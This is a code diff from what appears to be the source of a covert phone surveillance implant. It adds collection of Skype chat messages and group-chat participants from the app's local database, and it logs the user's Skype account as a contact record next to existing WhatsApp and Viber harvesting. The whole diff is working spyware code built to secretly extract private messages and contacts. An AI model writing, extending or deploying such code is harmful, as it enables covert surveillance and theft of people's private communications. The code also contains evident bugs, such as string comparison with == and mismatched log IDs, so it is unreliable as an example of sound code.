@@ -32,6 +32,7 @@
 #define AUTHOR_POS        1
 #define DIALOG_PART_POS   2
 #define ID_POS            3
+#define PARTICIPANTS_POS  4
 
 // Viber sql positions
 #define VIBER_PK_POS      0
@@ -40,6 +41,7 @@
 #define VIBER_PHONE_POS   3
 
 static BOOL gWahtAppContactGrabbed = NO;
+static BOOL gSkypeContactGrabbed = NO;
 
 #pragma mark -
 #pragma mark skXmlShared
@@ -165,11 +167,15 @@ foundCharacters:(NSString *)string
       mLastWAMsgPk = 0;
       mLastSkMsgPk = 0;
       mLastVbMsgPk = 0;
+      
       mAgentID = AGENT_IM;
+      
       mWADbPathName = nil;
       mWAUsername = @"";
       mSkDbPathName = nil;
       mSkUsername = @"";
+      mVbDbPathName = nil;
+      mVbUsername = @"";
     }
     
     return self;
@@ -280,6 +286,100 @@ foundCharacters:(NSString *)string
 - (BOOL)isThereSkype
 {
   return [self setSkDbPathName];
+}
+
+- (void)logSkypeContacts:(NSString*)contact
+{
+  if (mSkUsername == @"" || gSkypeContactGrabbed == YES)
+    return;
+  
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  ABLogStrcut header;
+  ABFile      abFile;
+  ABContats   abContat;
+  ABNumbers   abNumber;
+  Names       abNames;
+  
+  // setting magic
+  header.magic    = CONTACTLIST_2;
+  abFile.magic    = CONTACTFILE;
+  abContat.magic  = CONTACTCNT;
+  abNumber.magic  = CONTACTNUM;
+  abNames.magic   = CONTACTNAME;
+  
+  header.numRecords = 1;
+  header.len        = 0xFFFFFFFF;
+  
+  NSData *firstData = [@"Skype" dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
+  
+  // New contact
+  abFile.len   = 0;
+  
+  // 0x80000001 = WahtsApp
+  // 0x80000002 = Skype
+  // 0x80000004 = Viber
+  abFile.flag = 0x80000002;
+  
+  NSMutableData *abData = [[NSMutableData alloc] initWithCapacity: 0];
+  
+  // Add header
+  [abData appendBytes: (const void *) &header length: sizeof(header)];
+  
+  [abData appendBytes: (const void *) &abFile length: sizeof(abFile)];
+  
+  // FirstName abNames
+  abNames.len = [firstData length];
+  [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
+  [abData appendBytes: (const void *) [firstData bytes]
+               length: abNames.len];
+  
+  // LastName abNames
+  abNames.len = [firstData length];
+  [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
+  [abData appendBytes: (const void *) [firstData bytes]
+               length: abNames.len];
+  
+  // Telephone numbers
+  abContat.numContats = 1;
+  [abData appendBytes: (const void *) &abContat length: sizeof(abContat)];
+  
+  abNumber.type = 0;
+  [abData appendBytes: (const void *) &abNumber length: sizeof(abNumber)];
+  
+  abNames.len = [contact lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
+  
+  [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
+  [abData appendBytes: (const void *) [[contact dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]
+               length: abNames.len];
+  
+  
+  // Setting len of NSData - sizeof(magic)
+  ABLogStrcut *logS = (ABLogStrcut *) [abData bytes];
+  
+  logS->len = [abData length] - (sizeof(logS->magic) + sizeof(logS->len));
+  
+  _i_LogManager *logManager = [_i_LogManager sharedInstance];
+  
+  BOOL success = [logManager createLog: LOG_ADDRESSBOOK
+                           agentHeader: nil
+                             withLogID: 0xABCE];
+  
+  if (success == TRUE)
+  {
+    if ([logManager writeDataToLog: abData
+                          forAgent: LOG_ADDRESSBOOK
+                         withLogID: 0xABCE] == TRUE)
+    {
+      [logManager closeActiveLog: LOG_ADDRESSBOOK withLogID: 0xABCD];
+    }
+  }
+  
+  [abData release];
+  
+  [pool release];
+  
+  gSkypeContactGrabbed = TRUE;
 }
 
 #pragma mark -
@@ -556,10 +656,9 @@ foundCharacters:(NSString *)string
 {
   return [self setWADbPathName];
 }
-
 - (void)logWhatsAppContacts:(NSString*)contact
 {
-  if (gWahtAppContactGrabbed == YES)
+  if (mWAUsername == @"" || gWahtAppContactGrabbed == YES)
     return;
   
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
@@ -585,6 +684,9 @@ foundCharacters:(NSString *)string
   // New contact
   abFile.len   = 0;
   
+  // 0x80000001 = WahtsApp
+  // 0x80000002 = Skype
+  // 0x80000004 = Viber
   abFile.flag = 0x80000001;
   
   NSMutableData *abData = [[NSMutableData alloc] initWithCapacity: 0];
@@ -685,6 +787,38 @@ foundCharacters:(NSString *)string
   return sqlStr;
 }
 
+- (NSMutableString*)getSkMultiChatsMembers:(sqlite3_stmt*)compiledStatement
+                                    colNum:(int)column
+                                 excluding:(NSString*)author
+{
+  NSString *sqlStr = nil;
+  NSMutableString *retParts = [NSMutableString stringWithCapacity:0];
+  
+  char *tmpString = (char*)sqlite3_column_text(compiledStatement, column);
+  
+  if (tmpString != NULL)
+  {
+    sqlStr =[NSString stringWithUTF8String:tmpString];
+    
+    NSArray *tmpPartsArray = [sqlStr componentsSeparatedByString:@" "];
+    
+    for (int i=0; i < [tmpPartsArray count]; i++)
+    {
+      NSString *tmpPart = [tmpPartsArray objectAtIndex:i];
+
+      if ([tmpPart compare:author] != NSOrderedSame)
+      {
+        if ([retParts length] > 0)
+          [retParts appendString:@", "];
+          
+        [retParts appendString: tmpPart];
+      }
+    }
+  }
+  
+  return retParts;
+}
+
 - (NSMutableArray*)getSkChatMessagesFormDB:(sqlite3*)theDB
                                   withDate:(int)theDate
 {
@@ -694,8 +828,11 @@ foundCharacters:(NSString *)string
   sqlite3_stmt *compiledStatement;
   NSNumber *type = [NSNumber numberWithInt:0x00000001];
   
+//  char _wa_msg_query[] =
+//  "select body_xml, author, dialog_partner, id from Messages where id >";
+  
   char _wa_msg_query[] =
-  "select body_xml, author, dialog_partner, id from Messages where id >";
+  "select Messages.body_xml, Messages.author, Messages.dialog_partner, Messages.id, Chats.participants from Messages inner join Chats on Chats.name = Messages.chatname where Messages.id >";
   
   sprintf(wa_msg_query, "%s %d", _wa_msg_query, theDate);
   
@@ -716,6 +853,11 @@ foundCharacters:(NSString *)string
           NSString *sndr = [self getSqlString:compiledStatement colNum:AUTHOR_POS];
           
           NSString *peer = [self getSqlString:compiledStatement colNum:DIALOG_PART_POS];
+          
+          if (peer == nil)
+            peer = [self getSkMultiChatsMembers:compiledStatement
+                                         colNum:PARTICIPANTS_POS
+                                      excluding:sndr];
           
           if ([sndr compare:mSkUsername] == NSOrderedSame)
             flags = [NSNumber numberWithInt:0x00000001];
@@ -1483,6 +1625,8 @@ foundCharacters:(NSString *)string
   [self setWAUserName];
   
   [self logWhatsAppContacts:mWAUsername];
+  
+  [self logSkypeContacts:mSkUsername];
   
   [self getProperties];
   
